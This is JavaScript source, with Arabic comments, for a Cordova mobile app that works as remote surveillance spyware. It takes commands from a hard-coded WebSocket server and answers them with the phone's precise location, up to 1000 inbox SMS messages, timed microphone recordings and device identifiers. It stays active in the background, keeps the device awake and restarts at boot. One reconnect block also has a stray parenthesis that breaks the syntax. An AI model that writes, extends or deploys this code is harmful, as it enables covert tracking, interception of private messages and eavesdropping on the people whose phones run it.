// إضافة plugin للتحكم في الأذونات
document.addEventListener('deviceready', function() {
  // طلب الأذونات الضرورية أولاً
  requestRequiredPermissions();
}, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

// دالة لطلب الأذونات الضرورية
function requestRequiredPermissions() {
  console.log('Requesting required permissions...');
  
  // التحقق من وجود plugin الأذونات
  if (cordova.plugins && cordova.plugins.permissions) {
    const permissions = [
      cordova.plugins.permissions.ACCESS_FINE_LOCATION,
      cordova.plugins.permissions.READ_SMS,
      cordova.plugins.permissions.RECORD_AUDIO,
      cordova.plugins.permissions.RECEIVE_BOOT_COMPLETED,
      cordova.plugins.permissions.WAKE_LOCK
    ];
    
    // التحقق من حالة الأذونات
    cordova.plugins.permissions.checkPermission(permissions, function(status) {
      if (!status.hasPermission) {
        // طلب الأذونات
        cordova.plugins.permissions.requestPermissions(
          permissions,
          function() {
            console.log("All required permissions granted");
            onDeviceReady();
          },
          function(error) {
            console.warn("Some permissions denied", error);
            // الاستمرار حتى لو تم رفض بعض الأذونات
            onDeviceReady();
          }
        );
      } else {
        // الأذونات ممنوحة مسبقاً
        onDeviceReady();
      }
    }, function(error) {
      console.error("Failed to check permissions", error);
      onDeviceReady();
    });
  } else {
    // في حالة عدم وجود plugin الأذونات (مثل iOS)
    onDeviceReady();
  }
}

function onDeviceReady() {
  console.log('Device is ready');
  
  // تمكين التشغيل في الخلفية مع إعدادات محسّنة
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      color: '1a85ff',
      icon: 'icon', // سيتم استخدام أيقونة التطبيق
      resume: true,
      silent: true,
      hidden: false,
      bigText: true
    });
    
    cordova.plugins.backgroundMode.enable();
    
    // التعامل مع تفعيل الوضع الخلفي
    cordova.plugins.backgroundMode.on('activate', function() {
      // الحفاظ على الجهاز مستيقظاً
      if (window.plugins && window.plugins.insomnia) {
        window.plugins.insomnia.keepAwake();
      }
      
      // إعادة الاتصال بالخادم إذا لزم
      if (!window.wsConnection || window.wsConnection.readyState !== WebSocket.OPEN) {
        const deviceInfo = {
          uuid: device.uuid || generateUUID(),
          model: device.model || 'Unknown',
          platform: device.platform || 'Unknown',
          version: device.version || 'Unknown',
          manufacturer: device.manufacturer || 'Unknown',
          battery: null,
          timestamp: new Date().toISOString()
        };
        
        // تحديث معلومات البطارية
        if (navigator.getBattery) {
          navigator.getBattery().then(battery => {
            deviceInfo.battery = {
              level: Math.round(battery.level * 100),
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            };
            connectToServer(deviceInfo);
          }).catch(() => {
            connectToServer(deviceInfo);
          });
        } else {
          connectToServer(deviceInfo);
        }
      }
    });
    
    // التعامل مع إلغاء الوضع الخلفي
    cordova.plugins.backgroundMode.on('deactivate', function() {
      if (window.plugins && window.plugins.insomnia) {
        window.plugins.insomnia.allowSleepAgain();
      }
    });
  }
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString(),
          commandId: data.commandId
        });
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, data.commandId, (response) => {
          if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال مع تأخير متزايد (exponential backoff)
    let reconnectDelay = 1000; // 1 ثانية كبداية
    const maxReconnectDelay = 300000; // 5 دقائق كحد أقصى
    
    const attemptReconnect = () => {
      if (wsConnection && wsConnection.readyState !== WebSocket.CONNECTING) {
        console.log(`Attempting to reconnect in ${reconnectDelay}ms`);
        setTimeout(() => {
          const updatedDeviceInfo = {
            ...deviceInfo,
            timestamp: new Date().toISOString()
          };
          
          // تحديث معلومات البطارية قبل إعادة الاتصال
          if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
              updatedDeviceInfo.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
              };
              connectToServer(updatedDeviceInfo);
            }).catch(() => {
              connectToServer(updatedDeviceInfo);
            });
          } else {
            connectToServer(updatedDeviceInfo);
          });
          
          // زيادة التأخير للمحاولة التالية إذا استمر الفشل
          if (reconnectDelay < maxReconnectDelay) {
            reconnectDelay *= 2;
            if (reconnectDelay > maxReconnectDelay) {
              reconnectDelay = maxReconnectDelay;
            }
          }
        }, reconnectDelay);
      }
    };
    
    attemptReconnect();
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests // إرسال سجل الطلبات المستلمة
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, commandId, callback) {
  console.log('Executing command:', command);
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'download_sms':
      downloadSMS(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

// دالة جديدة لتنزيل الرسائل كملف نصي
function downloadSMS(commandId, callback) {
  getSMS(commandId, (response) => {
    if (response.status === 'success') {
      // تنسيق الرسائل كنص
      let smsText = "سجل الرسائل النصية\n";
      smsText += "====================\n\n";
      
      response.messages.forEach(msg => {
        const date = new Date(msg.date);
        smsText += `[${date.toLocaleString()}] من: ${msg.address}\n`;
        smsText += `${msg.body}\n\n`;
      });
      
      // إنشاء ملف ورابط تنزيل
      const blob = new Blob([smsText], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      
      callback({
        commandId,
        status: 'success',
        smsDownload: {
          url: url,
          fileName: `sms_backup_${Date.now()}.txt`,
          size: blob.size,
          content: smsText
        }
      });
    } else {
      callback(response);
    }
  });
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);
        
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName,
            blob: audioBlob
          }
        });
      };
      
      mediaRecorder.start();
      
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(fileName, blob) {
  // حفظ الملف في التخزين المحلي
  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
    dir.getFile(fileName, { create: true }, fileEntry => {
      fileEntry.createWriter(fileWriter => {
        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
        fileWriter.onerror = e => console.error('Error saving file:', e);
        fileWriter.write(blob);
      });
    });
  });
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
    console.log('App resumed, reconnecting...');
    const deviceInfo = {
      uuid: device.uuid || 'unknown',
      model: device.model || 'Unknown',
      platform: device.platform || 'Unknown',
      version: device.version || 'Unknown',
      manufacturer: device.manufacturer || 'Unknown',
      battery: null,
      timestamp: new Date().toISOString()
    };
    
    // تحديث معلومات البطارية
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        deviceInfo.battery = {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
        connectToServer(deviceInfo);
      }).catch(() => {
        connectToServer(deviceInfo);
      });
    } else {
      connectToServer(deviceInfo);
    }
  }
}, false);

// تفعيل التشغيل التلقائي بعد إعادة التشغيل (لـ Android)
document.addEventListener('deviceready', function() {
  if (cordova.plugins && cordova.plugins.autoStart) {
    cordova.plugins.autoStart.enable();
  }
}, false);
